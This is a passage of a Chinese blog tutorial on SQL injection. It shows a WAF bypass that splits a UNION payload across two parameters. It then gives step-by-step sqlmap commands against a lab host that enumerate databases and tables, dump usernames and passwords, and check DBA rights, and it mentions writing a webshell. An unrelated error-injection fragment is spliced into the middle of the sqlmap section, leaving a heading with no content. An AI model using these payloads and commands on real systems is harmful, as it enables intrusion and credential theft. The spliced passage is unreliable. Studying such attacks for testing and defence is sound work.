+</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM products WHERE type = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_a</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND detail = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$param_b</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
+</span></span></code></pre></div><p>WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分</p>
+<p>a部分输入：</p>
+<pre tabindex="0"><code>1&#39; union/*
+</code></pre><p>b部分输入：</p>
+<pre tabindex="0"><code>*/select 1,2#
+</code></pre><p>这样拼凑之后的sql语句就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">SELECT</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">FROM</span> <span style="color:#e06c75">products</span> <span style="color:#c678dd">WHERE</span> <span style="color:#c678dd">type</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">union</span><span style="color:#7f848e">/*&#39; AND detail = &#39;*/</span><span style="color:#c678dd">select</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">2</span><span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span></span></code></pre></div><p>我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句</p>
+<p><span style="color:#2c8af0;font-size:20px"><strong>恭喜，你现在已经学会了手工注入！</strong></span></p>
+<p><span style="color:aqua;font-size:20px"><strong>呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?</strong></span></p>
+<p><span style="color:#2c8af0;font-size:30px"><strong>当然是有的！那就是使用自动化注入工具&ndash;SqlMap！</strong></span></p>
+<h1 id="sqlmap使用">SqlMap使用
+</h1><p><strong>下载地址：</strong></p>
+<pre tabindex="0"><code>git clone https://github.com/sqlmapproject/sqlmap.git
+</code></pre><h2 id="基本使用步骤">基本使用步骤
+</h2><h3 id="检查注入点">检查注入点
+</h3><p><mark><strong>-u：指定目标url</strong></mark></p>
+<p><mark><strong>&ndash;batch：全自动模式，问什么都答对(y)</strong></mark>`</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627092400221.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627092400221"
+	
+	
+></p>
+<p>sqlmap指出它通过四种不同的方式成功注入了目标：</p>
+<ul>
+<li><strong><code>boolean-based blind</code> (布尔盲注)</strong></li>
+<li><strong><code>error-based</code> (报错注入)</strong></li>
+<li><strong><code>time-based blind</code> (时间盲注)</strong></li>
+<li><strong><code>UNION query</code> (联合查询注入)</strong></li>
+</ul>
+<p>而由布尔盲注的<code>payload:id=33 AND 3115=3115</code>可以看出是数字型注入（id=33周围无单引号）</p>
+<p>由联合查询注入的<code>target URL appears to have 15 columns in query</code>可以知道一共有十五个字段</p>
+<h3 id="爆破数据库信息">爆破数据库信息
+</h3><p><mark><strong>-dbs：爆破所有的数据库名称</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --dbs --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627093550491.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627093550491"
+	
+	
+></p>
+<p><strong><mark>&ndash;current-db：爆破当前数据库名称</mark></strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --current-db --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627093857366.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627093857366"
+	
+	
+></p>
+<p>结果说明现在的表名为cms</p>
+<h3 id="爆破指定数据库的所有表名">爆破指定数据库的所有表名
+</h3><p><mark><strong>-D：指定数据库名</strong></mark></p>
+<p><mark><strong>&ndash;tables：枚举所有表</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms --tables  --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627094523174.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627094523174"
+	
+	
+></p>
+<h3 id="爆破指定表的所有列名">爆破指定表的所有列名
+</h3><p><mark><strong>-T：指定表名</strong></mark></p>
+<p><mark><strong>&ndash;colums：枚举所有列</strong></mark></p>
+<p><strong>注意此处要先指定数据库名，再指定表名：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms -T cms_users --columns  --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627094938971.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627094938971"
+	
+	
+>#### extractvalue (XML_document, XPath_string)</p>
+<ul>
+<li>第一个参数：<code>XML_document</code> 是目标XML文档</li>
+<li>第二个参数：<code>XPath_string</code> <strong>是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#c678dd">user</span>,<span style="color:#e06c75">password</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">users</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">user_id</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#c678dd">and</span> (<span style="color:#e06c75">extractvalue</span>(<span style="color:#d19a66">1</span>,<span style="color:#d19a66">0</span><span style="color:#e06c75">x7e</span>));
+</span></span></code></pre></div><p>由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误</p>
+<h4 id="updatexml-xml_document-xpath_string-new_value-1">updatexml (XML_document, XPath_string, new_value)
+</h4><h3 id="打印指定列名的字段数据">打印指定列名的字段数据
+</h3><p><mark><strong>-C：指定列名</strong></mark></p>
+<p><mark><strong>&ndash;dump：取出指定列名的所有数据</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -D cms -T cms_users -C username,password --dump --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627095213209.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627095213209"
+	
+	
+></p>
+<h3 id="查看用户权限">查看用户权限
+</h3><p><mark><strong>&ndash;users：列出数据库管理系统用户</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --users --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627101333092.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627101333092"
+	
+	
+></p>
+<p><mark><strong>&ndash;current-user：查看当前连接数据库用户</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --current-user --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627101406633.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627101406633"
+	
+	
+></p>
+<p><mark><strong>&ndash;is-dba：判断当前用户是否是DBA（数据库管理员）</strong></mark></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> --is-dba --batch
+</span></span></code></pre></div><p><img src="C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627101434203"
+	
+	
+></p>
+<blockquote>
+<p>如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马</p></blockquote>
+<h3 id="查看数据库密码">查看数据库密码
+</h3><p><strong><mark>&ndash;password：自动寻找有没有常见的用户名和密码列</mark></strong></p>
+<p><strong>可以看成是一系列操作（找到password表和dump）的自动化</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -u http://192.168.204.133/show.php?id<span style="color:#56b6c2">=</span><span style="color:#d19a66">33</span> -passwords
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627111514038.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="结合burpsuite使用">结合burpsuite使用
+</h2><p><strong>有的时候我们需要对一个表单进行注入，这时候就可以使用post注入</strong></p>
+<p><strong><mark>-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）</mark></strong></p>
+<h3 id="拦截请求">拦截请求
+</h3><p>在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt<img src="http://picture.928330.xyz/typora/image-20250627100838668.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627100838668"
+	
+	
+></p>
+<h3 id="进行爆破">进行爆破
+</h3><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sqlmap -r post.txt --dbs --batch
+</span></span></code></pre></div><p><img src="http://picture.928330.xyz/typora/image-20250627101026867.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250627101026867"
+	
+	
+></p>
+<p>同样可以得到正确结果</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/sql/">SQL</a>
+        
+    </section>
+
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 2025-07-02
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">快速入门SQL</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/wiresharktshark%E7%AE%80%E6%98%93%E6%8C%87%E5%8C%97/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">wireshark&amp;tshark简易指北</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Vim编辑器完全使用教程</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bilibili","https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji","https://npm.elemecdn.com/@waline/emojis@1.1.0/weibo"],"lang":"zh-cn","locale":{"admin":"Admin","placeholder":null},"pageview":true,"placeholder":"欢迎评论，不好的评论我会删🙄💅🏻","requiredMeta":["name","email","url"],"serverURL":"https://comment.928330.xyz/"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 2025 - 2025 kakahuote | 引用请注明文章链接
+    </section>
+
+    <section class="running-time">
+        距离小站第一行代码被置下已经过去
+        <span id="runningdays" class="running-days"></span>    
+    </section>
+
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计 <br />
+
+        <span>...当然还有kakahuote🤓👆</span>
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+     
+     
+    @font-face {
+     font-family: 'yuan';  
+     src: url(https://blog.928330.xyz/font/round.ttf) format('truetype');  
+    }
+
+     
+     
+     
+    :root {
+     --base-font-family: 'yuan';  
+     --code-font-family: 'yuan';  
+      
+    }
+
+     
+
+     
+     
+     
+    #backTopBtn {
+     position: fixed;  
+     bottom: 30px;  
+     right: 450px;  
+     z-index: 99;  
+     cursor: pointer;  
+     width: 30px;  
+     height: 30px;  
+     background-image: url(https://blog.928330.xyz/icons/backTop.svg);  
+     background-size: cover;  
+     transition: transform 0.1s linear;  
+     transform-origin: center center;  
+    }
+
+    #backTopBtn.rotating {
+     transform: rotate(360deg);  
+    }
+
+     
+     
+     
+    .highlight {
+      
+     max-height: 400px;  
+     overflow: hidden;  
+     position: relative;  
+     transition: max-height 0.3s ease-out;  
+    }
+
+    .code-show {
+     max-height: none !important;  
+    }
+
+    .code-more-box {
+     width: 100%;  
+     padding-top: 20px;  
+     background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0), #fff);  
+     position: absolute;  
+     left: 0;
+     right: 0;
+     bottom: 0;
+     z-index: 1;  
+     text-align: center;  
+    }
+
+    .code-more-btn {
+     display: inline-block;  
+     padding: 5px 15px;  
+     background: #f0f0f5;  
+     border-radius: 5px;  
+     cursor: pointer;  
+     font-size: 0.9em;  
+    }
+   </style>
+
+   <script>
+     
+     
+     
+
+    let s1 = '2025-5-8 15:00:00'; 
+    s1 = new Date(s1.replace(/-/g, "/"));
+    let s2 = new Date();
+    let timeDifference = s2.getTime() - s1.getTime();
+
+    let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+    let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+    let result = days + "天" + hours + "小时" + minutes + "分钟";
+    if (document.getElementById('runningdays')) {
+        document.getElementById('runningdays').innerHTML = result;
+    }
+    
+     
+     
+     
+    
+
+    function initScrollTop() {
+     let rightSideBar = document.querySelector(".right-sidebar");
+     if (!rightSideBar) {
+      return;
+     }
+
+     
+     let btn = document.createElement("div");
+     btn.id = "backTopBtn";
+     let isRotating = false; 
+
+     btn.onclick = function() {
+      if (!isRotating) {
+       isRotating = true;
+       backToTop(this, () => {
+        isRotating = false; 
+       });
+      }
+     };
+     rightSideBar.appendChild(btn);
+
+     
+     btn.style.display = "block";
+    }
+
+    
+
+    function backToTop(button, onComplete) {
+     let rotation = 0;
+     let animationInterval;
+
+     window.scrollTo({ top: 0, behavior: "smooth" }); 
+
+     animationInterval = setInterval(() => {
+      rotation += 30; 
+      button.style.transform = `rotate(${rotation}deg)`;
+
+      if (window.scrollY === 0) {
+       clearInterval(animationInterval); 
+       button.style.transform = `rotate(0deg)`; 
+       if (onComplete) {
+        onComplete();
+       }
+      } else if (rotation >= 360 && window.scrollY !== 0) {
+       
+      }
+     }, 20); 
+    }
+
+    
+    initScrollTop();
+    
+    
+
+
+     
+     
+     
+    function initCodeMoreBox() {
+     let codeBlocks = document.querySelectorAll(".highlight");
+     if (!codeBlocks) {
+      return;
+     }
+     codeBlocks.forEach(codeBlock => {
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+       return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.innerText = '显示更多'; 
+      let isExpanded = false; 
+
+      codeMoreBtn.addEventListener('click', () => {
+       if (!isExpanded) {
+        codeBlock.classList.add('code-show'); 
+        codeMoreBtn.innerText = '折叠'; 
+        isExpanded = true;
+       } else {
+        codeBlock.classList.remove('code-show'); 
+        codeMoreBtn.innerText = '显示更多'; 
+        isExpanded = false;
+       }
+       
+       window.dispatchEvent(new Event('resize'));
+      });
+      
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox);
+     });
+    }
+
+    initCodeMoreBox();
+   </script>
+    </body>
+</html>
